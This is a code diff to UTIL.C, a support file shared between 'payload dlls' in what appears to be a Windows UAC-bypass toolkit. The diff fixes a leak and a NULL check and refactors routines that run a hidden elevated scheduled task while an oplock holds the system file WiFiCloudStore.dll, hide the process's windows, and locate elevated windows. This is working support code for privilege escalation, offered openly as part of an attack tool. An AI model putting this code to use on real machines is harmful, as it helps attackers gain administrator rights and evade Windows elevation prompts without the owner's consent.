@@ -4,9 +4,9 @@
 *
 *  TITLE:       UTIL.C
 *
-*  VERSION:     3.68
+*  VERSION:     3.69
 *
-*  DATE:        07 Mar 2025
+*  DATE:        07 Jul 2025
 *
 *  Global support routines file shared between payload dlls.
 *
@@ -258,6 +258,7 @@ HANDLE ucmOpenAkagiNamespace(
             break;
 
         if (!NT_SUCCESS(RtlAddSIDToBoundaryDescriptor(&hBoundary, pWorldSid))) {
+            RtlFreeSid(pWorldSid);
             break;
         }
 
@@ -674,6 +675,8 @@ PVOID ucmGetSystemInfo(
             return NULL;
 
         buffer = ucmxHeapAlloc((SIZE_T)bufferSize);
+        if (buffer == NULL)
+            return NULL;
     }
 
     if (NT_SUCCESS(ntStatus)) {
@@ -1959,6 +1962,14 @@ BOOL ucmSetEnvironmentVariable(
 // OpLocks from R41N3RZUF477.
 //
 
+/*
+* ucmxWaitForOpLockThread
+*
+* Purpose:
+*
+* Thread procedure to wait for oplock notification.
+*
+*/
 DWORD WINAPI ucmxWaitForOpLockThread(
     _In_ LPVOID p)
 {
@@ -1977,45 +1988,46 @@ DWORD WINAPI ucmxWaitForOpLockThread(
     return 0;
 }
 
+/*
+* ucmWaitForOpLock
+*
+* Purpose:
+*
+* Wait for oplock notification with timeout.
+* Returns TRUE if oplock was successfully acquired and signaled, FALSE otherwise.
+*
+*/
 BOOL ucmWaitForOpLock(
     _In_ POPLOCK_FILE_CONTEXT ofc,
     _In_ DWORD timeout
 )
 {
+    BOOL bResult = FALSE;
     DWORD exitcode = 0;
     HANDLE thread = NULL;
 
-    if (ofc == NULL) {
+    if (ofc == NULL || ofc->Length < sizeof(OPLOCK_FILE_CONTEXT)) {
         return FALSE;
     }
 
-    if (ofc->Length < sizeof(OPLOCK_FILE_CONTEXT)) {
+    thread = CreateThread(NULL, 0x1000, (LPTHREAD_START_ROUTINE)ucmxWaitForOpLockThread,
+        (LPVOID)ofc, STACK_SIZE_PARAM_IS_A_RESERVATION, NULL);
+    if (thread == NULL)
         return FALSE;
-    }
 
-    thread = CreateThread(NULL, 0x1000, (LPTHREAD_START_ROUTINE)ucmxWaitForOpLockThread, (LPVOID)ofc, STACK_SIZE_PARAM_IS_A_RESERVATION, NULL);
-    if (thread)
-    {
-        if (WaitForSingleObject(thread, timeout) != WAIT_OBJECT_0)
-        {
+    do {
+        if (WaitForSingleObject(thread, timeout) != WAIT_OBJECT_0) {
             TerminateThread(thread, 1);
-            CloseHandle(thread);
-            return FALSE;
+            break;
         }
-        if (!GetExitCodeThread(thread, &exitcode))
-        {
-            CloseHandle(thread);
-            return FALSE;
-        }
-        CloseHandle(thread);
-        if (exitcode)
-        {
-            return FALSE;
-        }
-        return TRUE;
-    }
 
-    return FALSE;
+        if (GetExitCodeThread(thread, &exitcode)) {
+            bResult = (exitcode == 0);
+        }
+    } while (FALSE);
+
+    CloseHandle(thread);
+    return bResult;
 }
 
 BOOL ucmReleaseOpLock(
@@ -2105,6 +2117,14 @@ BOOL ucmOpLockFile(
 // OpLocks from R41N3RZUF477 end.
 //
 
+/*
+* ucmxHideMainWindowCallback
+*
+* Purpose:
+*
+* EnumWindows callback to hide windows belonging to current process.
+*
+*/
 BOOL ucmxHideMainWindowCallback(
     _In_ HWND hwnd,
     _In_ LPARAM lParam
@@ -2298,6 +2318,14 @@ HANDLE ucmGetHwndFullProcessHandle(
     return hDuplicate;
 }
 
+/*
+* ucmxEnumElevatedWindows
+*
+* Purpose:
+*
+* EnumWindows callback to find first window belonging to elevated process.
+*
+*/
 BOOL ucmxEnumElevatedWindows(
     _In_ HWND hwnd, 
     _In_ LPARAM lParam)
@@ -2365,25 +2393,30 @@ HWND ucmFindFirstElevatedWindow(
     return hwnd;
 }
 
+/*
+* ucmStartBackupLockedElevatedProcess
+*
+* Purpose:
+*
+* Create oplock on system file and run elevated task through schtasks.exe.
+*
+*/
 BOOL ucmStartBackupLockedElevatedProcess(
     _In_ POPLOCK_FILE_CONTEXT ofc
 )
 {
+    BOOL bResult = FALSE;
     WCHAR szTaskCmdLine[MAX_PATH * 4];
     WCHAR szOplockPath[MAX_PATH * 2];
     PROCESS_INFORMATION pi;
     STARTUPINFO si;
     DWORD dwExitCode = 1;
 
-    if (ofc == NULL) {
+    if (ofc == NULL || ofc->Length < sizeof(OPLOCK_FILE_CONTEXT)) {
         return FALSE;
     }
 
-    if (ofc->Length < sizeof(OPLOCK_FILE_CONTEXT)) {
-        return FALSE;
-    }
-
-    szOplockPath[0] = 0;
+    RtlSecureZeroMemory(szOplockPath, sizeof(szOplockPath));
     ucmxQuerySystemDirectory(szOplockPath, FALSE);
     _strcpy(szTaskCmdLine, szOplockPath);
     _strcat(szOplockPath, L"WiFiCloudStore.dll");
@@ -2405,32 +2438,25 @@ BOOL ucmStartBackupLockedElevatedProcess(
     si.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
 
-    if (!CreateProcess(NULL, 
-        szTaskCmdLine, 
-        NULL, NULL, FALSE, 
-        CREATE_NEW_CONSOLE, 
-        NULL, NULL, 
-        &si, 
-        &pi)) 
+    if (!CreateProcess(NULL, szTaskCmdLine, NULL, NULL, FALSE, 
+        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) 
     {
         ucmReleaseOpLock(ofc);
         return FALSE;
     }
 
     CloseHandle(pi.hThread);
-    WaitForSingleObject(pi.hProcess, 3000);
-
-    if (!GetExitCodeProcess(pi.hProcess, &dwExitCode)) {
-        CloseHandle(pi.hProcess);
-        ucmReleaseOpLock(ofc);
-        return FALSE;
+    if (WaitForSingleObject(pi.hProcess, 3000) == WAIT_OBJECT_0) {
+        if (GetExitCodeProcess(pi.hProcess, &dwExitCode)) {
+            bResult = (dwExitCode == 0);
+        }
     }
 
     CloseHandle(pi.hProcess);
 
-    if (dwExitCode) {
+    if (!bResult) {
         ucmReleaseOpLock(ofc);
-        return FALSE;
     }
-    return TRUE;
+
+    return bResult;
 }
